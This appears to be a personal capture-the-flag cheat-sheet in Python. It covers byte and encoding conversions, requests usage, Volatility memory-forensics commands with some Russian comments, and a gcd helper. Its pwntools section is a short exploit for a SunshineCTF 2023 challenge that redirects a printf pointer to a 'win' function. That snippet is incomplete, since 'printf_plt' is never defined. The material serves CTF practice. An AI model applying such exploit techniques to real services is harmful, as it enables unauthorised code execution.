#SOME TYPES OPERATIONS
'''
char chr() ord()
byte bytes.fromhex() .hex()
base64 base64.b64encode()
bytes bytes_to_long() long_to_bytes()
'''

#REQUESTS
'''
s = requests.Session()

s.get('https://httpbin.org/cookies/set/sessioncookie/123456789')
r = s.get('https://httpbin.org/cookies')

print(r.text)
# '{"cookies": {"sessioncookie": "123456789"}}'

x = requests.get('https://w3schools.com')
print(x.status_code)

url = 'https://www.w3schools.com/python/demopage.php'
myobj = {'somekey': 'somevalue'}

x = requests.post(url, json = myobj)
requests.post(url, data={key: value}, json={key: value}, args)

'''
#PWNTOOLS
'''
xor(a,b)
from pwn import *

r = remote('chal.2023.sunshinectf.games', 23004)

r.recvuntil(b'At ')
buf = int(r.recvline(), 16)
print(buf)
fruits = 0x405080
printf_sym = 0x4050d0
offset = (printf_sym - fruits) // 8

win = 0x4011b9
offset2 = (printf_plt - fruits) // 8
r.sendline(str(offset).encode())
r.sendline(b'\x06' + b'\x00' * 7)
r.sendline(str(offset2).encode())
r.sendline(win.to_bytes(8, 'little'))

r.interactive()
'''

#volatility
'''
vol.py -f ./file.dmp imageinfo
vol.py --profile Win10x64_17763 -f ./file.dmp pslist
vol.py --profile Win10x64_17763 -f ./file.dmp iehistory (долго)
vol.py --profile Win10x64_17763 -f ./file.dmp netscan (долго)
vol.py --profile Win10x64_17763 -f ./file.dmp malfind
vol.py --profile Win10x64_17763 -f ./file.dmp clipboard
vol.py --profile Win10x64_17763 -f ./file.dmp svcscan
vol.py --profile Win10x64_17763 -f ./file.dmp dumpregistry(дамп реестра)
vol.py --profile Win10x64_17763 -f ./file.dmp dumpfiles -D ./aboba
vol.py --profile Win10x64_17763 -f ./file.dmp procdump -D . -p 1337
vol.py --profile Win10x64_17763 -f ./file.dmp memdump -D . -p 1337
vol.py --profile Win10x64_17763 -f ./file.dmp cmdline -D . -p 1337
'''


#from Crypto.Util.number import *
import base64
# pwn import *
#import pwn

def gcd(a,b):
    if b==0:
        return a
    else:
        return gcd(b,a%b)

